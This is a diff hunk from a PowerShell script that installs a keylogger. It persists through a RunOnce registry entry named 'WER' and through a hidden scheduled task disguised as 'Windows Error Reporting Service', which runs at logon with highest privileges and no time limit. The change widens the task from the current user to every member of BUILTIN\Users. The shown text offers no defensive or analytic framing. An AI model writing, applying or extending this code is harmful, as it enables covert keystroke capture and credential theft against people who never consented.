@@ -52,7 +52,7 @@ Set-ItemProperty -Path $runOnceKey -Name "WER" -Value "`"$stealthPy`" `"$keylogg
 # Create scheduled task with innocent name
 $action = New-ScheduledTaskAction -Execute $stealthPy -Argument $keyloggerPath
 $trigger = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
+$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
 
 Register-ScheduledTask -TaskName "Windows Error Reporting Service" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
